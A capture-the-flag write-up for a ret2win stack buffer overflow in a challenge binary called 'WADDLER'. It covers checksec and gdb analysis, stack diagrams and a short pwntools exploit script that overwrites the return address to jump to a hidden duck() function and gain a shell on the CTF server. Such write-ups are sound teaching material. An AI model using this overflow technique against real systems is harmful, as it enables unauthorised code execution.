# V1t CTF 2025 Writeup - WADDLER (PWN Category)

## The Challenge

<img width="503" height="455" alt="question" src="https://github.com/user-attachments/assets/9cdd9167-5e5a-4fa4-89f9-195a4444e750" />

* This is a pwn challenge involving a stack-based buffer overflow.
* The goal was to overwrite the return address on the stack to redirect execution to a hidden function that provides a shell. This type of exploit is known as **ret2win**

## The Approach

* The first step in any binary exploitation challenge is to understand the file we're dealing with.

<img width="1258" height="151" alt="screen1" src="https://github.com/user-attachments/assets/c72fc341-420a-4e11-a5f1-68fd738ddb12" />

* **ELF 64-bit LSB**: A 64-bit Linux executable using little-endian byte order. This means pointers & addresses are 8 bytes long.
* **Not Stripped**: It means the binary contains symbols, including functions & names.

* Running *checksec* would reveal the security features of the binary
<img width="1185" height="161" alt="Screenshot_2025-11-04_07-58-28" src="https://github.com/user-attachments/assets/fd447ec8-c9cb-4392-849d-c594a7826e32" />

*  **No canary found**: The Stack is not protected by a canary, so we can overwrite the return address.
*  **NX Enabled**: The stack is non-executable. We cannot inject & run our own shellcode from the stack.
*  **No PIE**: Position Independent Executable is disabled. Function addresses will always be the same.

* The *nm* command lists all the symbols.

<img width="808" height="664" alt="screen3" src="https://github.com/user-attachments/assets/a23e88a1-70c7-4955-b78c-243908efdbec" />

* There is no **win()** function in this challenge, but notice that there is a function called **duck()**.

* Let's use *gdb* to analyze the binary!

<img width="1257" height="667" alt="screen2" src="https://github.com/user-attachments/assets/018cfeb2-e319-47da-bee2-d18decb6a471" />


### Analyzing main function

* The program allocates a **64-bit buffer** on the stack `sub rsp, 0x40`.
* It then calls `fgets` to read up to ***80 bytes** into that buffer `mov esi, 0x50`.

* This mismatch allows us to write **16 bytes** past the end of the buffer. This overwrites both the saved `RBP` & the **return address**.

### Exploit Script 

``` plaintext 
#!/usr/bin/env python3
from pwn import *

context.binary = ELF('./chall')

p = remote('chall.v1t.site', 30210)

#Address of the 'duck' function
duck_address = 0x40128c

#Padding to overwrite the buffer and the saved RBP register (72 bytes)
padding = b'A' * 72

#Construct the payload: 72 bytes of padding + 8-byte address of duck()
payload = padding + p64(duck_address)

print("Sending payload...")
p.sendline(payload)
print("Payload sent!")

print("Switching to interactive mode...")
p.interactive()
```
### Output

<img width="874" height="640" alt="screen4" src="https://github.com/user-attachments/assets/f39d0954-83d6-4a5f-bc6e-622a6b5d7a39" />


### Diagrammatic Representation of Stack:

#### A Normal Function Call

       Higher Memory Addresses
      +-----------------------------+
      | ... (earlier stack data)    |
      +-----------------------------+
      |      Return Address         | <-- Where to go back to after main finishes (8 bytes)
      +-----------------------------+
      |      Saved RBP              | <-- The previous function's base pointer (8 bytes)
      +-----------------------------+ <--- RBP points here now
      |                             |
      |   buffer[63]                |
      |   ...                       |
      |   buffer[0]                 | <-- Your 64-byte buffer
      |                             |
      +-----------------------------+ <--- RSP points here now
        Lower Memory Addresses
        
#### An Overflow Function Call 

       
               Higher Memory Addresses
      +-----------------------------+
      | ... (earlier stack data)    |
      +-----------------------------+
      |   Address of duck()         | <-- OVERWRITTEN! (8 bytes)
      +-----------------------------+
      |   'A' * 8                   | <-- OVERWRITTEN! (8 bytes)
      +-----------------------------+ <--- RBP
      |   'A' * 64                  |
      |                             |
      |   (The buffer is full)      |
      |                             |
      +-----------------------------+ <--- RSP
        Lower Memory Addresses


        
